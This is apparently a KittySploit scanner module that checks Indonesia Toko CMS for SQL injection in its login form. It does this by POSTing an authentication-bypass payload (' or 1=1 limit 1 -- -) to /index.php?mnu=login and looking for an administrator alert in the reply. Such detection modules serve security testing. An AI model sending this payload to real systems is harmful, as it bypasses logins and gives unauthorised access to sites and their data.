#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Indonesia Toko CMS is susceptible to SQL Injection in its login system, enabling attackers to exploit vulnerab."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Indonasia Toko CMS - SQL Injection Detection',
        'description': 'Indonesia Toko CMS is susceptible to SQL Injection in its login system, enabling attackers to exploit vulnerabilities and bypass authentication by injecting malicious SQL code.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'sqli', 'toko', 'cms', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://cxsecurity.com/issue/WLB-2019030008'],
    }

    def run(self):
        path = '/index.php?mnu=login'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='user=%27+or+1%3D1+limit+1+--+-%2B&pass=%27+or+1%3D1+limit+1+--+-%2B&Login=Login\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ("alert('Administrator",)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='Indonasia Toko CMS - SQL Injection detected', path=path)
            return True
        return False

